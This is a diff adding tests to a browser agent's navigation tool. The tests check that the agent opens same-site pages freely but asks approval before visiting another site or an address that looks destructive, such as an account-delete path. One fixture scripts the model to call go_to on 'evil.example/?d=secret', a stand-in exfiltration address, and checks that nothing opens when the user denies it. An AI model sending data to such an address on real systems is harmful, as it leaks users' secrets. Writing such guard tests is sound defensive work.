@@ -504,3 +504,38 @@ test("the model's reasoning is passed to the UI for display", async () => {
   assert.equal(await run(), "done");
   assert.deepEqual(ui.thinks, ["check the page first", "nothing more to do, finishing"]);
 });
+
+test("go_to opens a same-site address, relative or absolute, without approval", async () => {
+  const { run, ui, agent } = setup({
+    sites: { [SHOP]: page("Shop", "home"), [`${SHOP}repo/tree/main`]: page("Files", "README.md model.safetensors") },
+    replies: [call("go_to", { url: "/repo/tree/main" }), answer("2 files")],
+  });
+  assert.equal(await run(), "2 files");
+  assert.equal(ui.cards.length, 0);
+  assert.match(results(agent)[0], /model\.safetensors/);
+});
+
+test("go_to asks before any new site, even with stay-on-site off, and opens nothing when denied", async () => {
+  const { run, ui, agent, web } = setup({
+    sites: { [SHOP]: page("Shop", "home"), "https://evil.example/?d=secret": page("Evil", "got it") },
+    replies: [call("go_to", { url: "https://evil.example/?d=secret" }), answer("ok")],
+    settings: { stayOnSite: false },
+    decide: () => "no",
+  });
+  await run();
+  assert.equal(ui.cards.length, 1);
+  assert.match(ui.cards[0].title, /another site/);
+  assert.match(results(agent)[0], /denied/);
+  assert.equal(web.tabs.get(1).url, SHOP);
+});
+
+test("go_to asks before an address that looks like it changes something", async () => {
+  const { run, ui, web } = setup({
+    sites: { [SHOP]: page("Shop", "home"), [`${SHOP}account/delete`]: page("Gone", "deleted") },
+    replies: [call("go_to", { url: "/account/delete" }), answer("ok")],
+    decide: () => "no",
+  });
+  await run();
+  assert.equal(ui.cards.length, 1);
+  assert.equal(web.tabs.get(1).url, SHOP);
+});
